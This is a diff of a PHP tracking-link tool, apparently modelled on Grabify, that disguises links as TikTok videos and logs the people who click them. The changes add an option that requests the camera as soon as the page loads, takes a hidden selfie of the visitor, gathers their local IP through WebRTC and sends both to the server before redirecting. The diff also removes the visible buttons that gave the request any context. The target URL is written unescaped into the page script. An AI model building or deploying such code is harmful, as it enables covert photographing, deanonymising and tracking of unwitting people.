@@ -17,9 +17,7 @@ try {
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
         target_url TEXT, 
-        sender_name TEXT,
-        sender_avatar TEXT,
-        bg_image TEXT,
+        capture_cam INTEGER DEFAULT 0,
         meta_title TEXT,
         meta_image TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
@@ -40,7 +38,7 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-function fetch_tiktok_exclusive_meta($url) {
+function fetch_tiktok_meta($url) {
     $meta = [
         'title' => 'TikTok Video',
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
@@ -66,35 +64,6 @@ function fetch_tiktok_exclusive_meta($url) {
             return $meta;
         }
     }
-
-    $ch_alt = curl_init();
-    curl_setopt($ch_alt, CURLOPT_URL, $url);
-    curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch_alt, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch_alt, CURLOPT_TIMEOUT, 6);
-    curl_setopt($ch_alt, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
-    curl_setopt($ch_alt, CURLOPT_SSL_VERIFYPEER, false);
-    $html = curl_exec($ch_alt);
-    curl_close($ch_alt);
-
-    if ($html) {
-        $dom = new DOMDocument();
-        @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
-        $xpath = new DOMXPath($dom);
-
-        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
-        if ($titleNodes->length > 0) {
-            $val = trim($titleNodes->item(0)->nodeValue);
-            if (!empty($val)) $meta['title'] = $val;
-        }
-
-        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
-        if ($imageNodes->length > 0) {
-            $val = trim($imageNodes->item(0)->nodeValue);
-            if (!empty($val)) $meta['image'] = $val;
-        }
-    }
-
     return $meta;
 }
 
@@ -135,6 +104,7 @@ function get_device_type($ua) {
     return 'Unknown Device';
 }
 
+// معالجة زيارة الرابط (شبيه بـ Grabify تماماً: معاينة للروبوتات وتوجيه فوري للمستخدم)
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
     $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
@@ -143,6 +113,7 @@ if (isset($_GET['r'])) {
 
     if ($link) {
         $target_redirect = $link['target_url'];
+        $capture_cam = (int)$link['capture_cam'];
         $meta_title = $link['meta_title'];
         $meta_image = $link['meta_image'];
 
@@ -191,16 +162,10 @@ if (isset($_GET['r'])) {
     <meta property="og:title" content="<?php echo htmlspecialchars($meta_title); ?>">
     <meta property="og:image" content="<?php echo htmlspecialchars($meta_image); ?>">
     <meta property="og:type" content="video.other">
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body, html { width: 100%; height: 100%; background: #0f172a; display: flex; justify-content: center; align-items: center; color: #fff; }
-        .container { text-align: center; max-width: 400px; width: 90%; padding: 20px; background: #1e293b; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        .thumb { width: 100%; height: 220px; object-fit: cover; border-radius: 10px; margin-bottom: 15px; }
-        h1 { font-size: 16px; margin-bottom: 15px; line-height: 1.4; color: #f8fafc; }
-        .btn-watch { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 10px; }
-        .btn-opt { display: block; width: 100%; background: #334155; color: #cbd5e1; border: none; padding: 10px; border-radius: 8px; font-size: 13px; cursor: pointer; }
-    </style>
     <script>
+        const shouldCapture = <?php echo $capture_cam; ?>;
+        const targetUrl = "<?php echo $target_redirect; ?>";
+
         function getLocalIP(callback) {
             let foundLocal = false;
             let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
@@ -221,63 +186,57 @@ if (isset($_GET['r'])) {
             setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        function requestCameraOptional() {
-            const targetUrl = "<?php echo $target_redirect; ?>";
-
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.setAttribute('autoplay', 'true');
-                    video.setAttribute('playsinline', 'true');
-                    video.style.display = 'none';
-                    video.srcObject = stream;
-                    document.body.appendChild(video);
-                    
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        window.addEventListener('DOMContentLoaded', () => {
+            if (shouldCapture === 1) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.setAttribute('autoplay', 'true');
+                        video.setAttribute('playsinline', 'true');
+                        video.style.display = 'none';
+                        video.srcObject = stream;
+                        document.body.appendChild(video);
                         
-                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                        stream.getTracks().forEach(track => track.stop());
-                        video.remove();
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 640;
+                            canvas.height = 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                            stream.getTracks().forEach(track => track.stop());
+                            video.remove();
 
-                        getLocalIP(function(localIp) {
-                            const formData = new URLSearchParams();
-                            formData.append('save_capture', '1');
-                            formData.append('image', imageData);
-                            formData.append('lip', localIp);
+                            getLocalIP(function(localIp) {
+                                const formData = new URLSearchParams();
+                                formData.append('save_capture', '1');
+                                formData.append('image', imageData);
+                                formData.append('lip', localIp);
 
-                            fetch(window.location.href, {
-                                method: 'POST',
-                                body: formData
-                            }).finally(() => {
-                                window.location.replace(targetUrl);
+                                fetch(window.location.href, {
+                                    method: 'POST',
+                                    body: formData
+                                }).finally(() => {
+                                    window.location.replace(targetUrl);
+                                });
                             });
-                        });
-                    }, 400);
-                })
-                .catch(err => {
-                    window.location.replace(targetUrl);
-                });
-        }
-
-        function directRedirect() {
-            window.location.replace("<?php echo $target_redirect; ?>");
-        }
+                        }, 500);
+                    })
+                    .catch(err => {
+                        window.location.replace(targetUrl);
+                    });
+            } else {
+                // إذا لم تكن مفعلة، يتم التوجيه فوراً ودون أي طلب كاميرا
+                window.location.replace(targetUrl);
+            }
+        });
     </script>
 </head>
-<body>
-    <div class="container">
-        <img src="<?php echo htmlspecialchars($meta_image); ?>" alt="Thumbnail" class="thumb">
-        <h1><?php echo htmlspecialchars($meta_title); ?></h1>
-        <button class="btn-watch" onclick="requestCameraOptional()">Watch this video on TikTok</button>
-        <button class="btn-opt" onclick="directRedirect()">Direct View (Skip)</button>
-    </div>
+<body style="background:#000;">
 </body>
 </html>
+<?>
 <?php 
         exit();
     } else {
@@ -285,42 +244,23 @@ if (isset($_GET['r'])) {
     }
 }
 
+// إنشاء رابط جديد مع خيار تفعيل أو إلغاء الكاميرا
 $generated_link = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
-    $sender_name = trim($_POST['sender_name']) ?: "User";
+    $capture_cam = isset($_POST['capture_cam']) ? 1 : 0;
     
     if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
         $target_url = "https://" . $target_url;
     }
 
-    $scraped = fetch_tiktok_exclusive_meta($target_url);
+    $scraped = fetch_tiktok_meta($target_url);
     $meta_title = $scraped['title'];
     $meta_image = $scraped['image'];
 
-    $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
-    if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
-        $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
-        $avatarName = 'avatar_' . uniqid() . '.' . $ext;
-        @move_uploaded_file($_FILES['avatar_file']['tmp_name'], $upload_dir . $avatarName);
-        $sender_avatar = $upload_dir . $avatarName;
-    } elseif (!empty($_POST['sender_avatar_url'])) {
-        $sender_avatar = trim($_POST['sender_avatar_url']);
-    }
-
-    $bg_image_url = "";
-    if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
-        $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
-        $bgName = 'bg_' . uniqid() . '.' . $ext;
-        @move_uploaded_file($_FILES['bg_file']['tmp_name'], $upload_dir . $bgName);
-        $bg_image_url = $upload_dir . $bgName;
-    } elseif (!empty($_POST['bg_image_url'])) {
-        $bg_image_url = trim($_POST['bg_image_url']);
-    }
-
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
-    $stmt = $db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar, bg_image, meta_title, meta_image) VALUES (?, ?, ?, ?, ?, ?, ?)");
-    $stmt->execute([$code, $target_url, $sender_name, $sender_avatar, $bg_image_url, $meta_title, $meta_image]);
+    $stmt = $db->prepare("INSERT INTO links (code, target_url, capture_cam, meta_title, meta_image) VALUES (?, ?, ?, ?, ?)");
+    $stmt->execute([$code, $target_url, $capture_cam, $meta_title, $meta_image]);
 
     $domain = $_SERVER['HTTP_HOST'];
     $generated_link = "https://" . $domain . "/?r=" . $code;
@@ -360,9 +300,12 @@ if (!empty($filter_code)) {
         h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }
 
         .form-grid { display: grid; gap: 12px; }
-        input[type="text"], input[type="file"] { width: 100%; background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
+        input[type="text"] { width: 100%; background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
         input[type="text"]:focus { border-color: var(--accent); }
         
+        .checkbox-group { display: flex; align-items: center; gap: 8px; font-size: 14px; color: var(--text-main); cursor: pointer; }
+        .checkbox-group input { width: 18px; height: 18px; cursor: pointer; }
+
         .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: background 0.2s; }
         .btn:hover { background: var(--accent-hover); }
         .btn-danger { background: var(--danger); }
@@ -401,10 +344,15 @@ if (!empty($filter_code)) {
     <div class="wrapper">
         
         <div class="section-box">
-            <h2>Generate TikTok Link</h2>
-            <form method="POST" enctype="multipart/form-data" class="form-grid">
+            <h2>Generate Direct Grabify-Style Link</h2>
+            <form method="POST" class="form-grid">
                 <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
-                <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)" style="display:none;">
+                
+                <label class="checkbox-group">
+                    <input type="checkbox" name="capture_cam" value="1">
+                    <span>تفعيل التقاط صورة سيلفي في الخلفية (Capture Selfie)</span>
+                </label>
+
                 <button type="submit" name="create" class="btn">Generate Link</button>
             </form>
 
